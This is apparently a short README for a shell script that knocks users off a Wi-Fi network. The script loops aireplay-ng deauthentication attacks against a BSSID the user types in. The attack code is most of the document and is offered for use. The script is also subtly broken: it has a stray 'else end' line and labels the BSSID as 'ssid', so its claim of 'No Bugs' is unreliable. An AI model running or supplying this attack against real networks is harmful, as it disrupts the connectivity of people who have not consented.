# Deauthenticate Users from Network

```bash
sudo bash script.bash
```

## Features

- Useable on any Linux System with Aireplay.ng 
- No Bugs
- Simple to use
- Made by a pro

## Script's Code

```shell
echo "Enter BSSID" 

read ssid
clear
for i in {1..10}; do sudo aireplay-ng --deauth 2 -a $ssid wlan0 ; date ; sleep 5 ; done

else end 
```


